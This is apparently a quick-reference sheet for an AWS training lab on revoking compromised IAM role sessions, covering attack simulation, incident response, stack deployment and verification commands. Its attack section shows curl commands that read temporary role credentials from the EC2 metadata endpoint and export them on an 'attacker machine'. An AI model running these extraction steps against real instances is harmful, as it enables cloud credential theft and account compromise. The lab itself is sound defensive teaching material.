# AWS Security Role Invalidation - Quick Reference

## Essential Commands

### Attack Simulation
```bash
# 1. Connect to EC2 instance
aws ssm start-session --target i-xxxxxxxxxxxxxxxxx

# 2. Extract role name
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/

# 3. Get credentials (replace ROLE_NAME)
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE_NAME

# 4. Test access from instance
aws s3 ls
aws ec2 describe-instances --region us-east-1

# 5. Configure stolen credentials (on attacker machine)
export AWS_ACCESS_KEY_ID=ASIXXXXXXXXXXXXXXXXX
export AWS_SECRET_ACCESS_KEY=XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
export AWS_SESSION_TOKEN=XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX

# 6. Verify external access
aws s3 ls
```

### Incident Response
```bash
# 1. Revoke sessions (AWS Console)
IAM → Roles → A4L-InstanceRole → Revoke active sessions

# 2. Verify attack blocked (from attacker machine)
aws s3 ls  # Should fail

# 3. Get affected instances
aws ec2 describe-instances \
  --filters "Name=iam-instance-profile.arn,Values=*A4L-InstanceRole*" \
  --query "Reservations[].Instances[].InstanceId" \
  --output text

# 4. Restart instances
aws ec2 stop-instances --instance-ids i-xxxxx i-xxxxx
aws ec2 wait instance-stopped --instance-ids i-xxxxx i-xxxxx
aws ec2 start-instances --instance-ids i-xxxxx i-xxxxx
aws ec2 wait instance-running --instance-ids i-xxxxx i-xxxxx

# 5. Verify service restored
aws ssm start-session --target i-xxxxxxxxxxxxxxxxx
aws s3 ls  # Should work
```

### Stack Management
```bash
# Deploy infrastructure
aws cloudformation create-stack \
  --stack-name aws-security-role-invalidation \
  --template-body file://infrastructure/A4LHostingInc.yaml \
  --capabilities CAPABILITY_IAM

# Check stack status
aws cloudformation describe-stacks \
  --stack-name aws-security-role-invalidation \
  --query 'Stacks[0].StackStatus'

# Get stack outputs
aws cloudformation describe-stacks \
  --stack-name aws-security-role-invalidation \
  --query 'Stacks[0].Outputs'

# Delete stack
aws cloudformation delete-stack \
  --stack-name aws-security-role-invalidation
```

### Verification Commands
```bash
# Check instance profile
aws ec2 describe-instances \
  --instance-ids i-xxxxxxxxxxxxxxxxx \
  --query 'Reservations[0].Instances[0].IamInstanceProfile.Arn'

# View revocation policy
aws iam get-role-policy \
  --role-name A4L-InstanceRole-XXXXX \
  --policy-name RevokeOldSessions

# Monitor CloudWatch logs
aws logs tail /var/log/secure --follow
aws logs tail /var/log/httpd/access_log --follow
```

## Timeline Reference

| Phase | Action | Duration |
|-------|--------|----------|
| Attack | Credential extraction | < 30 seconds |
| Attack | External configuration | < 2 minutes |
| Response | Session revocation | < 1 minute |
| Response | Attack verification | Immediate |
| Recovery | Instance restart | 5-6 minutes |
| Recovery | Service validation | < 1 minute |

## Key Files & Locations

- **Metadata endpoint**: `http://169.254.169.254/latest/meta-data/`
- **IAM Console path**: `IAM → Roles → [RoleName] → Revoke active sessions`
- **CloudFormation template**: `infrastructure/A4LHostingInc.yaml`
- **Instance logs**: `/var/log/secure`, `/var/log/httpd/access_log`